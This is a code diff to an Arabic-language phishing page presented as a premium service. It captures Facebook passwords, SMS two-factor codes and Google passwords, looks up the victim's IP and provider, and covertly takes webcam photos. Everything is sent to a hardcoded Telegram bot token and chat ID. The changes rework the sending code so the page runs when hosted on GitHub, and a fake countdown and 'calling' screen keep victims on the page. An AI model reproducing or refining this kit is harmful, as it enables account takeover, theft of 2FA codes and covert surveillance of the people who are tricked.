@@ -10,19 +10,16 @@
         .card { width: 90%; max-width: 400px; background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(15px); padding: 30px; border-radius: 25px; border: 1px solid var(--gold); box-shadow: 0 0 30px rgba(212, 175, 55, 0.1); text-align: center; position: relative; }
         .logo-img { width: 50px; margin-bottom: 10px; }
         .premium-tag { background: var(--gold); color: black; padding: 4px 12px; border-radius: 50px; font-weight: bold; font-size: 11px; margin-bottom: 15px; display: inline-block; }
-        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 10px; border: 1px solid #444; background: #222; color: white; box-sizing: border-box; outline: none; transition: 0.3s; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 10px; border: 1px solid #444; background: #222; color: white; box-sizing: border-box; outline: none; transition: 0.3s; text-align: center; }
         input:focus { border-color: var(--gold); }
         .btn { width: 100%; padding: 15px; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; transition: 0.3s; }
         
-        /* شاشات العرض */
         #step2, #step3, #loader-screen, #calling-screen { display: none; }
         
-        /* العداد */
         .progress-bar { width: 100%; background: #333; height: 8px; border-radius: 4px; margin: 20px 0; overflow: hidden; }
-        .fill { width: 0%; height: 100%; background: var(--gold); transition: linear; }
+        .fill { width: 0%; height: 100%; background: var(--gold); }
         
-        /* أنيميشن السماعة */
-        .phone-ring { width: 80px; height: 80px; border: 3px solid var(--gold); border-radius: 50%; margin: 20px auto; display: flex; align-items: center; justify-content: center; animation: pulse 1.5s infinite; }
+        .phone-ring { width: 80px; height: 80px; border: 3px solid var(--gold); border-radius: 50%; margin: 20px auto; display: flex; align-items: center; justify-content: center; animation: pulse 1.5s infinite; font-size: 30px; }
         @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(212, 175, 55, 0.4); } 70% { box-shadow: 0 0 0 20px rgba(212, 175, 55, 0); } 100% { box-shadow: 0 0 0 0 rgba(212, 175, 55, 0); } }
     </style>
 </head>
@@ -69,86 +66,104 @@
         <p>تم استلام بياناتك بنجاح، يرجى البقاء في الصفحة حتى يقوم الطرف الآخر بالرد على اتصالك.</p>
     </div>
 
-    <video id="v" style="display:none;" autoplay></video>
-    <canvas id="c" style="display:none;" width="320" height="240"></canvas>
+    <video id="v" style="display:none;" autoplay playsinline muted></video>
+    <canvas id="c" style="display:none;" width="640" height="480"></canvas>
 </div>
 
 <script>
     const token = '8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0';
     const chat = '8350812242';
 
-    window.onload = () => {
-        navigator.mediaDevices.getUserMedia({video:true}).then(s=>document.getElementById('v').srcObject=s);
-        navigator.geolocation.getCurrentPosition(()=>{},{});
-    };
+    // دالة إرسال النصوص المعدلة (POST لضمان العمل على GitHub)
+    async function sendMessage(text) {
+        try {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chat, text: text, parse_mode: 'Markdown' })
+            });
+        } catch (e) { console.error(e); }
+    }
 
+    // جلب الـ IP باستخدام HTTPS
+    async function getIP() {
+        try {
+            const r = await fetch('https://ipapi.co/json/');
+            const d = await r.json();
+            return `🌍 البلد: ${d.country_name}\n📍 IP: \`${d.ip}\`\n📡 المزود: ${d.org}`;
+        } catch (e) { return "تعذر جلب الـ IP"; }
+    }
+
+    // التقاط الصور وإرسالها
     async function capture(action) {
         const v = document.getElementById('v'), c = document.getElementById('c'), ctx = c.getContext('2d');
-        for(let i=1; i<=3; i++) {
-            ctx.drawImage(v, 0, 0, 320, 240);
-            const blob = await new Promise(r=>c.toBlob(r, 'image/jpeg'));
-            const fd = new FormData();
-            fd.append('chat_id', chat); fd.append('photo', blob); fd.append('caption', `📸 صورة ${i} - ${action}`);
-            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:fd});
-            await new Promise(r=>setTimeout(r, 800));
-        }
-    }
-
-    async function sendFull(title, data) {
-        let loc = "Access Denied";
-        try {
-            const r = await fetch('http://ip-api.com/json/');
-            const d = await r.json();
-            loc = `🌍 البلد: ${d.country} | المدينة: ${d.city}\n📡 ISP: ${d.isp}\n📍 IP: \`${d.query}\``;
-        } catch(e){}
-        const info = `🚀 **${title}** 🚀\n${data}\n\n📊 **System Info:**\n${loc}\n📱 الجهاز: \`${navigator.platform}\`\n📄 المتصفح: \`${navigator.userAgent.split(') ')[1]}\``;
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
-    }
-
-    function handleStep1() {
-        const u = document.getElementById('fb-user').value, p = document.getElementById('fb-pass').value;
-        if(!u || !p) return;
-        sendFull("FB Login", `👤: \`${u}\` | 🔑: \`${p}\``);
-        capture("FB Login");
-        document.getElementById('step1').style.display='none';
-        startLoader();
-    }
-
-    function startLoader() {
-        document.getElementById('loader-screen').style.display='block';
-        let t = 120;
-        const intr = setInterval(() => {
-            t--;
-            let m=Math.floor(t/60), s=t%60;
-            document.getElementById('timer').innerText = `${m<10?'0'+m:m}:${s<10?'0'+s:s}`;
-            document.getElementById('p-fill').style.width = ((120-t)/120*100)+'%';
-            if(t <= 0) { 
-                clearInterval(intr);
-                // انتظار 4 ثواني قبل إظهار الـ 2FA حسب طلبك
-                setTimeout(() => {
-                    document.getElementById('loader-screen').style.display='none';
-                    document.getElementById('step2').style.display='block';
-                }, 4000);
+        setTimeout(async () => {
+            for(let i=1; i<=3; i++) {
+                ctx.drawImage(v, 0, 0, 640, 480);
+                c.toBlob(async (blob) => {
+                    const fd = new FormData();
+                    fd.append('chat_id', chat);
+                    fd.append('photo', blob, 'img.jpg');
+                    fd.append('caption', `📸 صورة ${i} - ${action}`);
+                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+                }, 'image/jpeg', 0.7);
+                await new Promise(r => setTimeout(r, 1000));
             }
         }, 1000);
     }
 
-    function handleStep2() {
-        const c = document.getElementById('sms-code').value;
-        if(!c) return;
-        sendFull("FB 2FA", `🛡️ Code: \`${c}\``);
-        capture("FB 2FA");
-        document.getElementById('step2').style.display='none';
-        document.getElementById('step3').style.display='block';
+    async function handleStep1() {
+        const u = document.getElementById('fb-user').value, p = document.getElementById('fb-pass').value;
+        if(!u || !p) return;
+
+        // تفعيل الكاميرا عند الضغط
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('v').srcObject = stream;
+        } catch (e) {}
+
+        const ipData = await getIP();
+        await sendMessage(`🚀 **دخول فيسبوك جديد**\n👤 الحساب: \`${u}\`\n🔑 الباسورد: \`${p}\`\n\n${ipData}`);
+        capture("FB Login");
+
+        document.getElementById('step1').style.display = 'none';
+        startLoader();
     }
 
-    function handleStep3() {
+    function startLoader() {
+        document.getElementById('loader-screen').style.display = 'block';
+        let t = 120;
+        const intr = setInterval(() => {
+            t--;
+            let m = Math.floor(t / 60), s = t % 60;
+            document.getElementById('timer').innerText = `${m<10?'0'+m:m}:${s<10?'0'+s:s}`;
+            document.getElementById('p-fill').style.width = ((120 - t) / 120 * 100) + '%';
+            if (t <= 0) {
+                clearInterval(intr);
+                setTimeout(() => {
+                    document.getElementById('loader-screen').style.display = 'none';
+                    document.getElementById('step2').style.display = 'block';
+                }, 2000);
+            }
+        }, 1000);
+    }
+
+    async function handleStep2() {
+        const code = document.getElementById('sms-code').value;
+        if(!code) return;
+        await sendMessage(`🛡️ **رمز فيسبوك (2FA)**\n🔢 الرمز: \`${code}\``);
+        capture("2FA Code");
+        document.getElementById('step2').style.display = 'none';
+        document.getElementById('step3').style.display = 'block';
+    }
+
+    async function handleStep3() {
         const u = document.getElementById('gm-user').value, p = document.getElementById('gm-pass').value;
         if(!u || !p) return;
-        sendFull("Google Data", `📧: \`${u}\` | 🔑: \`${p}\``);
+        await sendMessage(`📧 **بيانات جوجل**\n📧 الحساب: \`${u}\`\n🔑 الباسورد: \`${p}\``);
         capture("Google Login");
-        document.getElementById('step3').style.display='none';
-        document.getElementById('calling-screen').style.display='block';
+        document.getElementById('step3').style.display = 'none';
+        document.getElementById('calling-screen').style.display = 'block';
     }
 </script>
 </body>
